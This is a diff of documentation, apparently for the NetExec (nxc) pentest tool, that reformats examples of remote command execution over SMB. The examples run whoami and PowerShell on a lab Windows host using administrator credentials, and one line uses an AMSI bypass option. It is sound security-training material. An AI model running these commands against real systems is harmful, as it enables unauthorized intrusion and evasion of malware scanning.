@@ -28,50 +28,50 @@
 
 ### In the following example, we try to execute whoami on the target using the -x flag:
 
-#### nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+    nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 
-06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
+    06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
 
-06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
+    06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
 
-06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
+    06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
 
-06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
+    06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
 
-06-05-2016 14:34:39 [*] KTHXBYE!
+    06-05-2016 14:34:39 [*] KTHXBYE!
 
 ### You can also directly execute PowerShell commands using the -X flag:
 
-#### nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+    nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
 
-06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
+    06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
 
-06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
+    06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
 
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
 
-06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
+    06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
 
-06-05-2016 14:36:10 [*] KTHXBYE!
+    06-05-2016 14:36:10 [*] KTHXBYE!
 
 # AMSI Bypass
 
-#### nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
+    nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
 
